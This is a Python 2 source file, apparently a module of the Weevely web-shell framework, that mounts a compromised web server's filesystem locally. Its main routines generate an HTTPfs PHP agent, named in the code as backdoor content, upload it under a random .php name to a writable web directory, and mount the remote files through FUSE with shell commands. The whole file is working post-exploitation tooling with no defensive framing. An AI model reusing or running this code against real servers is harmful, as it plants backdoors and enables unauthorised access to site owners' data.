from modules.file.upload2web import Upload2web
from modules.file.upload import WARN_NO_SUCH_FILE
from core.moduleexception import ModuleException, ProbeException, ProbeSucceed
from core.argparse import ArgumentParser
from core.argparse import SUPPRESS
import re, os
from core.utils import randstr
from commands import getstatusoutput
from tempfile import mkdtemp
from urlparse import urlparse
from platform import machine

WARN_ERR_RUN_HTTPFS = 'HTTPfs binary not found. Install it from \'https://github.com/cyrus-and/httpfs\'.'
WARN_ERR_GEN_PHP = 'HTTPfs PHP generation failed'
WARN_HTTPFS_MOUNTPOINT = 'Remote mountpoint not found'
WARN_HTTPFS_OUTP = 'HTTPfs output debug'
WARN_HTTPFS_RUN = 'HTTPfs run failed'
WARN_FUSE_UMOUNT = 'Fusermount umount failed'
WARN_MOUNT = 'Mount call failed'
WARN_MOUNT_NOT_FOUND = 'No HTTPfs mount found'
WARN_HTTPFS_CHECK = 'Check HTTPfs configuration following \'https://github.com/cyrus-and/httpfs\' instructions'
WARN_MOUNT_OK = """Mounted '%s' into local folder '%s'. 
Run ":file.mount -just-mount '%s'" to remount without reinstalling remote agent.
Umount with ':file.mount -umount-all'. When not needed anymore, remove%sremote agent."""

class Mount(Upload2web):
    '''Mount remote filesystem using HTTPfs '''

    def _set_args(self):
        
        self.argparser.add_argument('-remote-mount', help='Mount remote folder, default: \'.\'', default = '.')
        self.argparser.add_argument('-local-mount', help='Mount to local mountpoint, default: temporary folder')
        
        self.argparser.add_argument('-rpath', help='Upload PHP agent as rpath', nargs='?')
        self.argparser.add_argument('-startpath', help='Upload PHP agent in first writable subdirectory', metavar='STARTPATH', default='.')

        self.argparser.add_argument('-just-mount', metavar='URL', help='Mount URL without install PHP agent')
        self.argparser.add_argument('-just-install', action='store_true', help="Install remote PHP agent without mount")
        self.argparser.add_argument('-umount-all', action='store_true', help='Umount all mounted HTTPfs filesystems')
        
        self.argparser.add_argument('-httpfs-path', help='Specify HTTPfs binary path if not in system paths', default='httpfs')
        
        self.argparser.add_argument('-force', action='store_true', help=SUPPRESS)
        self.argparser.add_argument('-chunksize', type=int, default=1024, help=SUPPRESS)
        self.argparser.add_argument('-vector', choices = self.vectors.keys(), help=SUPPRESS)
        
    def _set_vectors(self):
        Upload2web._set_vectors(self)
        
        self.support_vectors.add_vector("exists", 'file.check', "$rpath exists".split(' '))
        
    def _prepare(self):

        self.__check_httpfs()
    
        # If not umount or just-mount URL, try installation
        if not self.args['umount_all'] and not self.args['just_mount']:
            
            self.__generate_httpfs()
                        
            Upload2web._prepare(self)

        # If just mount, set remote url
        elif self.args['just_mount']:
            self.args['url'] = self.args['just_mount']



    def _probe(self):
        
        
        if not self.support_vectors.get('exists').execute({ 'rpath' : self.args['remote_mount'] }):
            raise ProbeException(self.name, '%s \'%s\'' % (WARN_HTTPFS_MOUNTPOINT, self.args['remote_mount']))             
        
        self.args['remote_mount'] = self.support_vectors.get('normalize').execute({ 'path' : self.args['remote_mount'] })
    
        
        if self.args['umount_all']:
            # Umount all httpfs partitions
            self.__umount_all()
            raise ProbeSucceed(self.name, 'Unmounted partitions')
        
        if not self.args['just_mount']:
            # Upload remote
            try:    
                Upload2web._probe(self)
            except ProbeSucceed:
                pass
                
        if not self.args['just_install']:
            
            if not self.args['local_mount']:
                self.args['local_mount'] = mkdtemp()
                
            cmd = '%s mount %s %s %s' % (self.args['httpfs_path'], self.args['url'], self.args['local_mount'], self.args['remote_mount'])
    
            status, output = getstatusoutput(cmd)
            if status == 0:
                if output:
                    raise ProbeException(self.name,'%s\nCOMMAND:\n$ %s\nOUTPUT:\n> %s\n%s' % (WARN_HTTPFS_OUTP, cmd, output.replace('\n', '\n> '), WARN_HTTPFS_CHECK))
                    
            else:
                raise ProbeException(self.name,'%s\nCOMMAND:\n$ %s\nOUTPUT:\n> %s\n%s' % (WARN_HTTPFS_RUN, cmd, output.replace('\n', '\n> '), WARN_HTTPFS_CHECK))
                    

    def _verify(self):
        # Verify Install
        if not self.args['umount_all'] and not self.args['just_mount']:
            Upload2web._verify(self)
              
    def _stringify_result(self):


        self._result = [
                        self.args['url'] if 'url' in self.args else None, 
                        self.args['local_mount'], 
                        self.args['remote_mount']
                        ]

        # Verify Install
        if not self.args['umount_all'] and not self.args['just_mount'] and not self.args['just_install']:
            
            urlparsed = urlparse(self.modhandler.url)
            if urlparsed.hostname:
                remoteuri = '%s:%s' % (urlparsed.hostname, self.args['remote_mount'])
    
            rpath = ' '
            if self.args['rpath']:
                rpath = ' \'%s\' ' % self.args['rpath']
    
            self._output = WARN_MOUNT_OK % ( remoteuri, self.args['local_mount'], self.args['url'], rpath )
                
                
    def __umount_all(self):
        
        status, output = getstatusoutput('mount')
        if status != 0 or not output:
            raise ProbeException(self.name, '%s: %s' % (WARN_FUSE_UMOUNT, output))     

        local_mountpoints = re.findall('(/[\S]+).+httpfs',output)
        if not local_mountpoints:
            raise ProbeException(self.name, WARN_MOUNT_NOT_FOUND)  
            
        for mountpoint in local_mountpoints:
        
            cmd = 'fusermount -u %s' % (mountpoint)
            status, output = getstatusoutput(cmd)
            if status != 0:
                raise ProbeException(self.name, '%s: %s' % (WARN_FUSE_UMOUNT, output))     
        
        self.mprint('Umounted: \'%s\'' % '\', '.join(local_mountpoints))


    def __check_httpfs(self):
        
        status, output = getstatusoutput('%s --version' % self.args['httpfs_path'])
        if status != 0 or not output:
            raise ModuleException(self.name, '\'%s\' %s' % (self.args['httpfs_path'], WARN_ERR_RUN_HTTPFS))        

    def __generate_httpfs(self):
        
        status, php_bd_content = getstatusoutput('%s generate php' % (self.args['httpfs_path']))
        if status != 0 or not php_bd_content:
            raise ProbeException(self.name, '\'%s\' %s' % (self.args['httpfs_path'], WARN_ERR_GEN_PHP))

        self.args['lpath'] = randstr(4) + '.php'
        self.args['content'] = php_bd_content        
        
